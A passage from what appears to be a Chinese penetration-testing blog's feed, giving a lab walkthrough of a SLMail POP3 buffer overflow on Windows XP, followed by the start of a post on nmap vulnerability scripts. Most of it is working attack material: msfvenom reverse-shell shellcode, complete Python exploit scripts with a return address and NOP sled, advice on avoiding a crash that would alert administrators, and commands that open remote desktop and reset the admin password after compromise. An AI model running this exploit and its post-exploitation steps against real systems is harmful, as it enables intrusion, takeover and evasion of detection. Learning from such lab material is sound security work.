alt="image-20221220181738558"></p><blockquote><p>上一步的地址为0161A154，此时正是ESP寄存器的地址，存放的都是ASCII中的C字符；</p><p>此时我们已经实现了对EIP的修改，也实现了它跳转到ESP，下一步就需要将ESP中的C替换为真正的shellcode。</p></blockquote><h5 id="16、生成shellcode"><a href="#16、生成shellcode" class="headerlink" title="16、生成shellcode"></a>16、生成shellcode</h5><p><code>msfvenom -l payload</code>命令查看payload</p><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221220183515120.png" alt="image-20221220183515120"></p><p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.216.166 LPORT=4444 -a x86 --platform Windows -f c</code></p><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221220185049283.png" alt="image-20221220185049283"></p><pre class="line-numbers language-none"><code class="language-none">&quot;\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x89\xe5\x64\x8b\x52&quot;&quot;\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26&quot;&quot;\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d&quot;&quot;\x01\xc7\x49\x75\xef\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01&quot;&quot;\xd0\x8b\x40\x78\x85\xc0\x74\x4c\x01\xd0\x8b\x58\x20\x01&quot;&quot;\xd3\x8b\x48\x18\x50\x85\xc9\x74\x3c\x31\xff\x49\x8b\x34&quot;&quot;\x8b\x01\xd6\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75&quot;&quot;\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe0\x58\x8b\x58\x24\x01&quot;&quot;\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01&quot;&quot;\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58&quot;&quot;\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d\x68\x33\x32\x00&quot;&quot;\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\x89\xe8&quot;&quot;\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80&quot;&quot;\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\xd8\xa6\x68\x02\x00&quot;&quot;\x11\x5c\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea&quot;&quot;\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74&quot;&quot;\x61\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67&quot;&quot;\x00\x00\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f&quot;&quot;\xff\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10&quot;&quot;\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53&quot;&quot;\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8&quot;&quot;\x00\x7d\x28\x58\x68\x00\x40\x00\x00\x6a\x00\x50\x68\x0b&quot;&quot;\x2f\x0f\x30\xff\xd5\x57\x68\x75\x6e\x4d\x61\xff\xd5\x5e&quot;&quot;\x5e\xff\x0c\x24\x0f\x85\x70\xff\xff\xff\xe9\x9b\xff\xff&quot;&quot;\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb\xf0\xb5\xa2\x56\x6a&quot;&quot;\x00\x53\xff\xd5&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221220185410444.png" alt="image-20221220185410444"></p><blockquote><p>此时的shellcode包含坏字符，不能够使用</p></blockquote><p>执行以下命令去掉坏字符：</p><pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.216.166 LPORT&#x3D;4444 -a x86 --platform Windows -b &#39;\x00\x0a\x0d&#39; -f C<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221220210646780.png" alt="image-20221220210646780"></p><h5 id="17、写入shellcode"><a href="#17、写入shellcode" class="headerlink" title="17、写入shellcode"></a>17、写入shellcode</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python</span><span class="token keyword">import</span> sockets <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>shellcode <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">"\xda\xd2\xbd\x8d\xdf\xf7\x6c\xd9\x74\x24\xf4\x58\x31\xc9"</span><span class="token operator">+</span><span class="token string">"\xb1\x59\x31\x68\x19\x83\xc0\x04\x03\x68\x15\x6f\x2a\x0b"</span><span class="token operator">+</span><span class="token string">"\x84\xe0\xd5\xf4\x55\x9e\xe4\x26\x31\xd5\x55\xf7\x33\x0c"</span><span class="token operator">+</span><span class="token string">"\xd2\xa5\x4f\x45\xb7\x5d\xdb\x2b\x10\x51\x6c\x81\x46\x5c"</span><span class="token operator">+</span><span class="token string">"\x6d\x24\x47\x32\xad\x27\x3b\x49\xe2\x87\x02\x82\xf7\xc6"</span><span class="token operator">+</span><span class="token string">"\x43\x54\x7d\x27\x19\x30\xf6\xe5\x8e\x35\x4a\x35\xae\x99"</span><span class="token operator">+</span><span class="token string">"\xc0\x05\xc8\x9c\x17\xf1\x64\x9e\x47\xa9\xff\xf8\x47\xc2"</span><span class="token operator">+</span><span class="token string">"\x48\xe1\x86\x07\xcd\xd8\xfd\x9b\xff\x25\xb4\x68\xcb\x52"</span><span class="token operator">+</span><span class="token string">"\x46\xb8\x05\xa5\xe5\x85\xa9\x28\xf7\xc2\x0e\xd3\x82\x38"</span><span class="token operator">+</span><span class="token string">"\x6d\x6e\x95\xfb\x0f\xb4\x10\x1b\xb7\x3f\x82\xff\x49\x93"</span><span class="token operator">+</span><span class="token string">"\x55\x74\x45\x58\x11\xd2\x4a\x5f\xf6\x69\x76\xd4\xf9\xbd"</span><span class="token operator">+</span><span class="token string">"\xfe\xae\xdd\x19\x5a\x74\x7f\x38\x06\xdb\x80\x5a\xee\x84"</span><span class="token operator">+</span><span class="token string">"\x24\x11\x1d\xd2\x59\xda\xdd\xdb\x07\x4c\x11\x16\xb8\x8c"</span><span class="token operator">+</span><span class="token string">"\x3d\x21\xcb\xbe\xe2\x99\x43\xf2\x6b\x04\x93\x83\x7c\xb7"</span><span class="token operator">+</span><span class="token string">"\x4b\x2b\xec\x49\x6c\x4b\x24\x8e\x38\x1b\x5e\x27\x41\xf0"</span><span class="token operator">+</span><span class="token string">"\x9e\xc8\x94\x6c\x95\x5e\xd7\xd8\x71\x35\xbf\x1a\x82\x5b"</span><span class="token operator">+</span><span class="token string">"\x1c\x93\x64\x0b\xcc\xf3\x38\xec\xbc\xb3\xe8\x84\xd6\x3c"</span><span class="token operator">+</span><span class="token string">"\xd6\xb5\xd8\x97\x7f\x5f\x37\x41\xd7\xc8\xae\xc8\xa3\x69"</span><span class="token operator">+</span><span class="token string">"\x2e\xc7\xc9\xaa\xa4\xed\x2e\x64\x4d\x84\x3c\x91\x2a\x66"</span><span class="token operator">+</span><span class="token string">"\xbd\x62\xdf\x66\xd7\x66\x49\x31\x4f\x65\xac\x75\xd0\x96"</span><span class="token operator">+</span><span class="token string">"\x9b\x06\x17\x68\x5a\x3e\x63\x5f\xc8\x7e\x1b\xa0\x1c\x7e"</span><span class="token operator">+</span><span class="token string">"\xdb\xf6\x76\x7e\xb3\xae\x22\x2d\xa6\xb0\xfe\x42\x7b\x25"</span><span class="token operator">+</span><span class="token string">"\x01\x32\x2f\xee\x69\xb8\x16\xd8\x35\x43\x7d\x5a\x31\xbb"</span><span class="token operator">+</span><span class="token string">"\x03\x75\x9a\xd3\xfb\xc5\x1a\x23\x96\xc5\x4a\x4b\x6d\xe9"</span><span class="token operator">+</span><span class="token string">"\x65\xbb\x8e\x20\x2e\xd3\x05\xa5\x9c\x42\x19\xec\x41\xda"</span><span class="token operator">+</span><span class="token string">"\x1a\x03\x5a\xed\x61\x6c\x5d\x0e\x96\x64\x3a\x0f\x96\x88"</span><span class="token operator">+</span><span class="token string">"\x3c\x2c\x40\xb1\x4a\x73\x50\x86\x45\xc6\xf5\xaf\xcf\x28"</span><span class="token operator">+</span><span class="token string">"\xa9\xb0\xc5"</span><span class="token punctuation">)</span> <span class="token builtin">buffer</span> <span class="token operator">=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">2606</span> <span class="token operator">+</span> <span class="token string">"\xe3\x41\x4b\x5f"</span> <span class="token operator">+</span> <span class="token string">"\x90"</span> <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">+</span> shellcode <span class="token keyword">try</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\nSending evil buffer..."</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'192.168.216.172'</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'USER test'</span><span class="token operator">+</span><span class="token string">'\r\n'</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'PASS '</span><span class="token operator">+</span><span class="token builtin">buffer</span><span class="token operator">+</span><span class="token string">'\r\n'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\nDone!"</span><span class="token punctuation">)</span><span class="token keyword">except</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Could not connect to POP3"</span><span class="token punctuation">)</span>    <span class="token triple-quoted-string string">'''跳转地址后，在ESP寄存器中先添加了8个\x90(hex)，\x90在汇编中表示nop表示不操作，这是为了shellcode运行的有效性，如果不加，在EIP跳转过来紧接着执行shellcode，在CPU进行解析时可能导致前几个字节被覆盖，为了避免异常情况的产生，所以加上一段nop，shellcode就会被连续被执行。'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="18、Getshell"><a href="#18、Getshell" class="headerlink" title="18、Getshell"></a>18、Getshell</h5><p>本地监听4444端口</p><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221220212416581.png" alt="image-20221220212416581"></p><p>执行写入shellcode的脚本</p><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221220222321679.png" alt="image-20221220222321679"></p><blockquote><p>写入shellcode后能够连接到，但是没有反弹shell；检查windowsXP发现每次监听端口时候服务就会停止，看了几篇帖子，应该是新版本msf生成的shellcode出现了问题，可能生成的shellcode字节太大了，并且新版本的msf不支持<code>./msfpayload win32_reverse LHOST=192.168.216.173 LPORT=4444 R | ./msfencode -b &quot;\x00\x0a\x0d&quot;</code>；换了一个低版本的msf。</p></blockquote><h5 id="19、重新生成shellcode"><a href="#19、重新生成shellcode" class="headerlink" title="19、重新生成shellcode"></a>19、重新生成shellcode</h5><pre class="line-numbers language-none"><code class="language-none">.&#x2F;msfpayload win32_reverse LHOST&#x3D;192.168.216.172 LPORT&#x3D;4444 R | .&#x2F;msfencode -b &quot;\x00\x0a\x0d&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221220233922194.png" alt="image-20221220233922194"></p><h5 id="20、Getshell"><a href="#20、Getshell" class="headerlink" title="20、Getshell"></a>20、Getshell</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python</span><span class="token keyword">import</span> sockets <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>shellcode <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">"\x6a\x48\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xcb\x66\x91"</span><span class="token operator">+</span><span class="token string">"\x82\x83\xeb\xfc\xe2\xf4\x37\x0c\x7a\xcf\x23\x9f\x6e\x7d\x34\x06"</span><span class="token operator">+</span><span class="token string">"\x1a\xee\xef\x42\x1a\xc7\xf7\xed\xed\x87\xb3\x67\x7e\x09\x84\x7e"</span><span class="token operator">+</span><span class="token string">"\x1a\xdd\xeb\x67\x7a\xcb\x40\x52\x1a\x83\x25\x57\x51\x1b\x67\xe2"</span><span class="token operator">+</span><span class="token string">"\x51\xf6\xcc\xa7\x5b\x8f\xca\xa4\x7a\x76\xf0\x32\xb5\xaa\xbe\x83"</span><span class="token operator">+</span><span class="token string">"\x1a\xdd\xef\x67\x7a\xe4\x40\x6a\xda\x09\x94\x7a\x90\x69\xc8\x4a"</span><span class="token operator">+</span><span class="token string">"\x1a\x0b\xa7\x42\x8d\xe3\x08\x57\x4a\xe6\x40\x25\xa1\x09\x8b\x6a"</span><span class="token operator">+</span><span class="token string">"\x1a\xf2\xd7\xcb\x1a\xc2\xc3\x38\xf9\x0c\x85\x68\x7d\xd2\x34\xb0"</span><span class="token operator">+</span><span class="token string">"\xf7\xd1\xad\x0e\xa2\xb0\xa3\x11\xe2\xb0\x94\x32\x6e\x52\xa3\xad"</span><span class="token operator">+</span><span class="token string">"\x7c\x7e\xf0\x36\x6e\x54\x94\xef\x74\xe4\x4a\x8b\x99\x80\x9e\x0c"</span><span class="token operator">+</span><span class="token string">"\x93\x7d\x1b\x0e\x48\x8b\x3e\xcb\xc6\x7d\x1d\x35\xc2\xd1\x98\x25"</span><span class="token operator">+</span><span class="token string">"\xc2\xc1\x98\x99\x41\xea\x0b\xce\x49\x2f\xad\x0e\x80\xde\xad\x35"</span><span class="token operator">+</span><span class="token string">"\x18\x63\x5e\x0e\x7d\x7b\x61\x06\xc6\x7d\x1d\x0c\x81\xd3\x9e\x99"</span><span class="token operator">+</span><span class="token string">"\x41\xe4\xa1\x02\xf7\xea\xa8\x0b\xfb\xd2\x92\x4f\x5d\x0b\x2c\x0c"</span><span class="token operator">+</span><span class="token string">"\xd5\x0b\x29\x57\x51\x71\x61\xf3\x18\x7f\x35\x24\xbc\x7c\x89\x4a"</span><span class="token operator">+</span><span class="token string">"\x1c\xf8\xf3\xcd\x3a\x29\xa3\x14\x6f\x31\xdd\x99\xe4\xaa\x34\xb0"</span><span class="token operator">+</span><span class="token string">"\xca\xd5\x99\x37\xc0\xd3\xa1\x67\xc0\xd3\x9e\x37\x6e\x52\xa3\xcb"</span><span class="token operator">+</span><span class="token string">"\x48\x87\x05\x35\x6e\x54\xa1\x99\x6e\xb5\x34\xb6\xf9\x65\xb2\xa0"</span><span class="token operator">+</span><span class="token string">"\xe8\x7d\xbe\x62\x6e\x54\x34\x11\x6d\x7d\x1b\x0e\x61\x08\xcf\x39"</span><span class="token operator">+</span><span class="token string">"\xc2\x7d\x1d\x99\x41\x82"</span><span class="token punctuation">)</span> <span class="token builtin">buffer</span> <span class="token operator">=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">2606</span> <span class="token operator">+</span> <span class="token string">"\xe3\x41\x4b\x5f"</span> <span class="token operator">+</span> <span class="token string">"\x90"</span> <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">+</span> shellcode <span class="token keyword">try</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\nSending evil buffer..."</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'192.168.216.172'</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'USER test'</span><span class="token operator">+</span><span class="token string">'\r\n'</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'PASS '</span><span class="token operator">+</span><span class="token builtin">buffer</span><span class="token operator">+</span><span class="token string">'\r\n'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\nDone!"</span><span class="token punctuation">)</span><span class="token keyword">except</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Could not connect to POP3"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>监听端口</p><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221220233735035.png" alt="image-20221220233735035"></p><p>执行脚本</p><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221220234505872.png" alt="image-20221220234505872"></p><p>Getshell成功</p><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221220234548137.png" alt="image-20221220234548137"></p><blockquote><p>更低版本的MSF生成的shellcode执行结束会以exitprocess方式退出整个进程，将导致邮件服务奔溃，会引起管理员注意；由于Slmail是一个基于线程的应用，可用ExitThread方式可以避免整个服务崩溃，可实现重复溢出。</p><p>执行以下命令即可：</p><pre class="line-numbers language-none"><code class="language-none">.&#x2F;msfpayload win32_reverse LHOST&#x3D;10.10.10.171 EXITFUNC&#x3D;thread LPORT&#x3D;444 R | .&#x2F;msfencode -b &quot;\x00\x0a\x0d&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><h5 id="21、拿到GUI界面"><a href="#21、拿到GUI界面" class="headerlink" title="21、拿到GUI界面"></a>21、拿到GUI界面</h5><p>现在是命令行的方式控制目标机器，可以通过命令行打开目标机器的远程桌面，得到图形化的方式控制目标机器；</p><p>执行以下的一系列命令达到修改注册表的键值打开远程桌面服务：</p><pre class="line-numbers language-none"><code class="language-none">echo Windows Registry Editor Version 5.00&gt;3389.regecho [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]&gt;&gt;3389.regecho &quot;fDenyTSConnections&quot;&#x3D;dword:00000000&gt;&gt;3389.regecho [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp]&gt;&gt;3389.regecho &quot;PortNumber&quot;&#x3D;dword:00000d3d&gt;&gt;3389.regecho [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp]&gt;&gt;3389.regecho &quot;PortNumber&quot;&#x3D;dword:00000d3d&gt;&gt;3389.regregedit &#x2F;s 3389.reg<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221221001046138.png" alt="image-20221221001046138"></p><p>查看目录已经存在3389.reg文件</p><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221221001115679.png" alt="image-20221221001115679"></p><p>此时的远程桌面是没有开启的</p><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221221001340765.png" alt="image-20221221001340765"></p><p>重启服务器</p><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221221001422107.png" alt="image-20221221001422107"></p><p>远程桌面服务器已经开启</p><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221221001545235.png" alt="image-20221221001545235"></p><h5 id="22、安装远程桌面服务"><a href="#22、安装远程桌面服务" class="headerlink" title="22、安装远程桌面服务"></a>22、安装远程桌面服务</h5><p>rdesktop是Linux系统连接windows远程桌面的客户端程序</p><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221221001708606.png" alt="image-20221221001708606"></p><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221221001924555.png" alt="image-20221221001924555"></p><p>登录管理员帐户</p><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221221002025130.png" alt="image-20221221002025130"></p><h5 id="23、修改管理员密码"><a href="#23、修改管理员密码" class="headerlink" title="23、修改管理员密码"></a>23、修改管理员密码</h5><p>拿到一台服务器权限时候有时候是不知道管理员密码的，这时候可以修改管理员密码</p><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221221002511139.png" alt="image-20221221002511139"></p><p>远程登录</p><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221221002555967.png" alt="image-20221221002555967"></p><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221221002614969.png" alt="image-20221221002614969"></p><blockquote><p>成功拿下主机。</p></blockquote><blockquote><p>windows主机的每一步配置都会写在注册表里，拿下权限之后通过修改注册表的键值来达到控制主机的目的。可以使用<code>RegSnap</code>这个软件来比较注册表发生变化的前后键值，就能够清楚那些键值被改变。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 缓冲区溢出 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kali </tag>
            
            <tag> 缓冲区溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kali渗透测试-漏洞扫描工具</title>
      <link href="/2022/12/15/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/"/>
      <url>/2022/12/15/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="Nmap-Script"><a href="#Nmap-Script" class="headerlink" title="Nmap Script"></a>Nmap Script</h2><ul><li>nmap漏洞扫描脚本路径<ul><li>&#x2F;usr&#x2F;share&#x2F;nmap&#x2F;scripts &#x2F;scripts.db<ul><li><img src="/2022/12/15/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/image-20221215111733441.png" alt="image-20221215111733441"></li></ul></li><li>漏洞利用脚本<ul><li>less script.db | grep vuln | wc -l<ul><li><img src="/2022/12/15/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/image-20221215111836570.png" alt="image-20221215111836570"></li></ul></li></ul></li></ul></li></ul><h3 id="Smb-vuln-ms10-061-nse"><a href="#Smb-vuln-ms10-061-nse" class="headerlink" title="Smb-vuln-ms10-061.nse"></a>Smb-vuln-ms10-061.nse</h3><blockquote><ul><li>Smb-vuln-ms10-061.nse<ul><li>Stuxnet蠕虫利用的4个漏洞之一<ul><li>Stuxnet：震网病毒</li></ul></li><li><code>Print Spooler</code>服务权限不当，打印机请求可在系统目录可创建文件、可执行任意代码</li><li>通过<code>LANMAN API</code>枚举共享打印机</li><li>远程共享打印机名称</li><li>smb-enum-shares枚举共享<ul><li>身份认证参数—smbuser、smbpassword</li><li>nmap -p445 –script&#x3D;smb-enum-shares.nse –script-args&#x3D;smbuser&#x3D;admin,smbpassword&#x3D;pass 1.1.1.1</li></ul></li><li>Windows XP,Server 2003 SP2,Vista,Server 2008,win7</li></ul></li><li>影响扫描结果的因素<ul><li>若没有使用smb-enum-shares脚本探测共享打印机名称，只是通过ms10-061脚本默认的<code>LANMAN API</code>查询，若目标系统没有开启<code>LANMAN API</code>，脚本就会直接判断目标系统不存在这个漏洞；其他扫描器可能通过帐号密码登录到目标系统通过<code>查询有没有打ms10-061的补丁</code>去判断是否存在这个漏洞，若没有打这个补丁，但没有开启共享打印机，漏洞就不会被利用</li></ul></li><li>原理<ul><li>ms10-061脚本先探测目标系统是否存在共享打印机，之后通过LANMAN探测目标系统共享打印机名称，直接进行攻击性的探测；若目标系统没有开放LANMAN API，探测不到共享打印机，nmap使用枚举共享的脚本smb-enum-shares.nse探测共享打印机，再利用ms10-061去探测是否可以在系统目录可创建文件、可执行任意代码</li></ul></li></ul></blockquote><ul><li>使用Smb-vuln-ms10-061.nse脚本的LANMAN API没有发现共享打印机，可以使用枚举脚本<ul><li><p>nmap -p445 –script&#x3D;smb-enum-shares.nse 192.18.216.167</p><ul><li><p><img 